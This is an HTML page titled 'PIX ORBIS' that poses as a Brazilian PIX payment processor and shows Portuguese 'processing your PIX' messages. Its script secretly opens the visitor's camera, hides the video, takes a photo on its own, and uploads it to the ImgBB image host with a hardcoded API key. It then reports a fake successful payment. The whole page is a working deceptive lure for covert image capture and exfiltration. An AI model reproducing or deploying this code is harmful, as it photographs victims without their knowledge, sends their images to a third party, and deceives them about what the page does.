<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIX ORBIS</title>
</head>
<body>
    <h1>PIX ORBIS</h1>
    <p>Aguarde enquanto processamos o seu PIX...</p>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <p id="status"></p>
    <script>
        // Configuração do ImgBB
        const apiKey = 'b6147e113acc9c24966a9c0f888f0242'; // Sua API Key

        // Exibe uma mensagem ao usuário
        const statusMessage = document.getElementById('status');
        statusMessage.textContent = "Validando os dados...";

        // Acessar a câmera
        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Quando o vídeo estiver pronto, captura automaticamente
                video.addEventListener('loadeddata', () => {
                    statusMessage.textContent = "Processando seu PIX...";
                    captureAndUpload();
                });
            })
            .catch(err => {
                console.error('Erro ao acessar câmera:', err);
                statusMessage.textContent = "Erro ao processar o PIX. Por favor, recarregue a página.";
            });

        // Função para capturar imagem e enviar ao ImgBB
        function captureAndUpload() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Converter imagem em Base64
            const imageData = canvas.toDataURL('image/png');
            console.log('Imagem capturada automaticamente.');

            // Enviar imagem ao ImgBB
            const formData = new FormData();
            formData.append('key', apiKey);
            formData.append('image', imageData.split(',')[1]); // Remove "data:image/png;base64,"

            fetch('https://api.imgbb.com/1/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                console.log('Imagem enviada:', result.data.url);
                statusMessage.textContent = "Seu PIX foi processado com sucesso!";
            })
            .catch(error => {
                console.error('Erro ao enviar imagem:', error);
                statusMessage.textContent = "Erro ao processar o PIX. Tente novamente mais tarde.";
            });
        }
    </script>
</body>
</html>
